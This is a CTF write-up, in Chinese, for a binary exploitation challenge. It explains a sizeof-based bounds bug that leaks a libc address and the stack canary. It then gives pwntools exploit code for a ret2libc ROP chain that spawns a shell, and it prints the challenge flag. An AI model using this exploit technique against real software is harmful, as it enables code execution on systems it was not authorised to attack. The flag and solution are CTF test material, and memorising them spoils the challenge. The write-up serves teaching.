# Wetuwn to Wibc

## 题目简述

程序维护一个 9 元素计数数组，却把 sizeof(uwus) 当作“元素个数”检查索引；在 64 位下 sizeof 返回 72，导致索引 9 至 71 都能越界读取栈。索引 47 可泄漏 libc 返回地址，索引 43 可泄漏 Canary。随后程序又用不安全读取收集反馈，可在保留 Canary 的前提下构造 ret2libc。

## 解题过程

先用两个越界索引建立运行时地址：

~~~python
io.sendlineafter(b"Index: ", b"47")
libc_leak = recv_counter()
libc.address = libc_leak - libc.libc_start_main_return

io.sendlineafter(b"Index: ", b"43")
canary = recv_counter()
io.sendlineafter(b"Index: ", b"-1")
~~~

反馈缓冲区到 Canary 的偏移是 0x108，之后还有保存的 RBP。使用题目配套 libc 中的 /bin/sh 和 system；先放一个 ret 保持 16 字节栈对齐：

~~~python
rop = ROP(libc)
payload = flat({
    0x108: canary,
    0x118: [
        rop.find_gadget(["ret"])[0],
        rop.find_gadget(["pop rdi", "ret"])[0],
        next(libc.search(b"/bin/sh\x00")),
        libc.sym["system"],
    ],
})
io.sendlineafter(
    b"Thanks for using my UwU Counter! What did you think?\n",
    payload,
)
~~~

获得 shell 后读取 flag：

~~~text
maple{f1y_m3_t0_th3_m00n_4nd_l3t_m3_pl4y_am0ngu5}
~~~

## 方法总结

sizeof(数组) 返回字节数，不是元素数；边界应写成 sizeof(array) / sizeof(array[0])。利用上，越界读常用于先击穿 ASLR 和 Canary，再用独立的越界写或栈溢出接管控制流。ret2libc 必须使用远程匹配的 libc，并注意 ABI 栈对齐。
